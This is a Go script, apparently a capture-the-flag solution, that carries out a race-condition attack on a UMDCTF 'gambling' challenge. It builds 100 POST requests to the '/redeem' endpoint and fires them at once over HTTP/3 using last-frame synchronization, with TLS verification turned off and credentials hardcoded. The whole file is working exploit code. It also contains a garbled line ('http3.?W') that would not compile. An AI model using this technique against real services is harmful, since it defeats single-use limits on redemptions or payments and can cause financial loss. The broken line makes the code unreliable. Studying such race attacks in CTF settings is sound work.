package main

import (
	"crypto/tls"
	"fmt"

	"context"
	"io"
	"net/http"
	"os"
	"time"

	quic "github.com/nxenon/h3spacex"
	"github.com/nxenon/h3spacex/http3"
)

func main() {
	tlsConf := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{http3.NextProtoH3},
	}

	quicConf := &quic.Config{
		MaxIdleTimeout:  10 * time.Second,
		KeepAlivePeriod: 10 * time.Millisecond,
	}

	var allRequests []*http.Request

	username := "ampunDJ123444122"
	password := "ampunDJ123444122"

	headers := map[string]string{
		"Cookie":        "x=y",
		"authorization": fmt.Sprintf("{\"username\":\"%s\",\"password\":\"%s\"}", username, password),
		// "Content-Type":  "application/json", // sample
	}

	reqBody := "eW91IHRoaW5rIHlvdSdyZSBzcGVjaWFsIGJlY2F1c2UgeW91IGtub3cgaG93IHRvIGRlY29kZSBiYXNlNjQ/"
	reqBodyString := fmt.Sprintf(`"%s"`, reqBody)
	// reqBodyString := "10"
	// reqBodyString := fmt.Sprintf(`{"username":"%s", "password": "%s"}`, username, password)
	for i := 0; i < 100; i++ { // 1000 requests
		req, err2 := http3.GetRequestObject("https://gambling.challs.umdctf.io/redeem", "POST", headers, []byte(reqBodyString))
		if err2 != nil {
			fmt.Println("Error creating request: ", err2)
			continue
		}
		// req, err2 := http3.GetRequestObject("https://gambling.challs.umdctf.io/register", "POST", headers, []byte(reqBodyString))
		// if err2 != nil {
		//      fmt.Println("Error creating request: ", err2)
		//      continue
		// }
		// req, err2 := http3.GetRequestObject("https://gambling.challs.umdctf.io/wager", "POST", headers, []byte(reqBodyString))
		// if err2 != nil {
		//      fmt.Println("Error creating request: ", err2)
		//      continue
		// }
		allRequests = append(allRequests, &req)
	}

	dialAddress := "104.196.176.59:443" // destination IP address and UDP port
	ctx := context.Background()
	quicConn, err := quic.DialAddr(ctx, dialAddress, tlsConf, quicConf)
	if err != nil {
		fmt.Printf("Error Connecting to %s. Erorr: %s", dialAddress, err)
		os.Exit(1)
	}
	// http3.SendRequestBytesInStream(quicConn, allRequests)
	allResponses := http3.SendRequestsWithLastFrameSynchronizationMethod(quicConn, allRequests, 0, 150, true)
	// http3.send]
	http3.?W
	for req, res := range allResponses {
		fmt.Printf("for request to %s\n", req.URL)
		fmt.Println("+---Headers---+")
		fmt.Printf("Status Code: %d\n", res.StatusCode)
		for key, value := range res.Header {
			fmt.Printf("%s: %s\n", key, value[0])
		}
		fmt.Println("+---Body---+")
		body, err3 := io.ReadAll(res.Body)
		if err3 != nil {
			fmt.Println("Error reading response body:", err3)
			continue
		}
		fmt.Println(string(body))

	}
}
